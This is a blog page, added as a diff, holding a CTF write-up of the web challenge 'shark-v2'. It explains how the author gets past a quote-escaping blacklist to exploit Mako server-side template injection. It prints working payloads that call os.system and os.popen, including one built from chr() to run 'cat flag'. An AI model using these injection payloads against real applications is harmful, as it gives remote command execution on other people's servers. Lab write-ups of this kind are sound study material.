@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="/assets/css/normalize.css">
+    <link rel="stylesheet" href="/assets/css/ockham.css">
+    <script async src="/assets/js/ockham.js"></script>
+    <script async src="https://use.fontawesome.com/releases/v5.15.4/js/all.js"></script>
+
+    
+<link rel="icon" href="/assets/img/cryptoicontfc.svg">
+<title>shark-v2 | hofill's blog</title>
+
+
+</head>
+
+
+<body>
+<input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox">
+<div class="sidebar" id="sidebar">
+  <div class="sidebar-item">
+    <img style="box-shadow: 0px 5px 10px 5px rgba(0,0,0,0.6)" alt="picture of me" src="/assets/img/noria22.png">
+  </div>
+  <div class="sidebar-item">
+    <p>The place where <strike>magic</strike> hacking happens.</p>
+  </div>
+
+  
+  <nav class="sidebar-nav">
+    <ul class="sidebar-nav-list">
+    
+      <li">
+        <a href="/" class="sidebar-nav-item ">
+          Home
+        </a>
+      </li>
+    
+      <li">
+        <a href="/about" class="sidebar-nav-item ">
+          About
+        </a>
+      </li>
+    
+      <li">
+        <a href="/writeups" class="sidebar-nav-item ">
+          Writeups
+        </a>
+      </li>
+    
+      <li">
+        <a href="/blogs" class="sidebar-nav-item ">
+          Blogs
+        </a>
+      </li>
+    
+    </ul>
+  </nav>
+  
+
+  
+  <div class="sidebar-item">
+    
+      <a class="social-icon" href="https://github.com/hofill" target="_blank">
+        <i class="fab fa-github" title="GitHub"></i>
+      </a>
+    
+  </div>
+  
+
+  <div class="sidebar-item">
+    <small>
+      Powered by <a href="https://jekyllrb.com/" target="_blank">Jekyll</a> & <a href="https://github.com/zivong/ockham" target="_blank">Ockham</a>
+    </small>
+  </div>
+</div>
+
+
+<div class="wrap">
+    <div class="container">
+
+        <header class="masthead">
+            <div class="masthead-title">
+                <a href="/" title="Home"><span style="color: #06BCC1">hofill > ./blog</span></a>
+                <small>Crypto enthusiast.</small>
+            </div>
+        </header>
+
+        <main>
+            <article class="post"><img alt="" src="https://unr22-individual.cyberedu.ro/images/contests/BMwo9sxqDZaYqNem.png" class="header-photo"><h1 class="post-title" style="color: #EF596F"><span class="helper">
+        <img class="category-image" alt=""
+                                                          src="/assets/img/categories/web.svg"></span><span
+                class="title">shark-v2</span></h1>
+    <div class="post-meta">
+        <time datetime="2022-05-22T00:00:00+00:00" itemprop="datePublished">
+            22 May 2022
+        </time>•
+        
+        <span itemprop="author" itemscope itemtype="http://schema.org/Person">hofill</span></div>
+    <div class="post-writeup-tags">
+        
+        <div class="type">
+            web
+        </div>
+        
+        <div class="type">
+            Mako
+        </div>
+        
+        <div class="type">
+            blacklist
+        </div>
+        
+        <div class="type">
+            SSTI
+        </div>
+        
+    </div>
+
+    <h1 id="legend">Legend</h1>
+<ul>
+  <li><a href="#descr">Challenge Description</a></li>
+  <li><a href="#flagproof">Flag Proof</a></li>
+  <li><a href="#summary">Summary</a></li>
+  <li><a href="#details">Details</a></li>
+</ul>
+
+<h1 id="descr">Challenge Description</h1>
+
+<p>Shark with a twist.</p>
+
+<h1 id="flagproof">Flag Proof</h1>
+
+<blockquote>
+  <p>CTF{d40de1849fdcdc50b34e23b5acb874aabd8c106c43d837f1d42b12336a51dee0}</p>
+
+</blockquote>
+
+<h1 id="summary">Summary</h1>
+
+<p>SSTI using Mako and bypassing blacklist</p>
+
+<h1 id="details">Details</h1>
+
+<p>This challenge had a blacklist. Not only were we not allowed to use certain words, but <code class="language-plaintext highlighter-rouge">&lt;</code>, <code class="language-plaintext highlighter-rouge">&gt;</code> and others were being escaped. We had to get creative.</p>
+
+<p>I tried a bunch of things like getting the <code class="language-plaintext highlighter-rouge">pageargs</code>:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Payload</span><span class="p">:</span> <span class="n">name</span><span class="o">=</span><span class="err">$</span><span class="p">{</span><span class="n">pageargs</span><span class="p">}</span>
+</code></pre></div></div>
+
+<p>And we got:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Hello</span> <span class="p">{</span><span class="s">'data'</span><span class="p">:</span> <span class="s">'world'</span><span class="p">}</span><span class="err">!</span>
+</code></pre></div></div>
+
+<p>But that didn’t help out much. I then started searching online for some vulnerabilities in Mako. I found this:</p>
+
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#mako">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server Side Template Injection/README.md#mako</a></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="p">{</span><span class="bp">self</span><span class="p">.</span><span class="n">module</span><span class="p">.</span><span class="n">cache</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"id"</span><span class="p">)}</span>
+<span class="err">$</span><span class="p">{</span><span class="bp">self</span><span class="p">.</span><span class="n">module</span><span class="p">.</span><span class="n">runtime</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"id"</span><span class="p">)}</span>
+<span class="p">...</span>
+</code></pre></div></div>
+
+<p>However, I could not use <code class="language-plaintext highlighter-rouge">'</code> or <code class="language-plaintext highlighter-rouge">"</code> in my payload, as it got escaped. I remembered that Python has the function <code class="language-plaintext highlighter-rouge">chr</code>. I used this to my advantage and created the following payload:</p>
+
+<p><img src="/assets/img/sharkv2/Untitled.png" alt="Untitled" /></p>
+
+<p>(%2b is a plus sign, and we are building the words <code class="language-plaintext highlighter-rouge">cat flag</code> using <code class="language-plaintext highlighter-rouge">chr()</code>)</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="p">{</span><span class="bp">self</span><span class="p">.</span><span class="n">module</span><span class="p">.</span><span class="n">cache</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">99</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">102</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">108</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">bchr</span><span class="p">(</span><span class="mi">103</span><span class="p">)).</span><span class="n">read</span><span class="p">()}</span>
+</code></pre></div></div>
+
+<p>After sending this, we get the flag:</p>
+
+<p>CTF{d40de1849fdcdc50b34e23b5acb874aabd8c106c43d837f1d42b12336a51dee0}</p>
+
+
+</article>
+
+
+
+<div class="post-pagination">
+    
+    <a class="post-pagination-item left" href="/writeup/oootp">
+        <i class="fas fa-chevron-left"></i> <span class="post-pagination-title">oootp
+</span>
+    </a>
+    
+
+    
+    <a class="post-pagination-item right" href="/writeup/shark">
+        <span class="post-pagination-title">shark
+</span> <i
+            class="fas fa-chevron-right"></i>
+    </a>
+    
+</div>
+
+        </main>
+
+        <footer class="footer">
+            <small>
+                &copy;
+                <time datetime="2022-05-22T21:14:15+00:00">2022</time>&nbsp;<a href="https://github.com/hofill/" target="_blank">hofill</a>. All rights reserved.
+            </small>
+        </footer>
+    </div>
+</div>
+
+<label for="sidebar-checkbox" class="sidebar-toggle"></label>
+
+
+
+
+</body>
+</html>
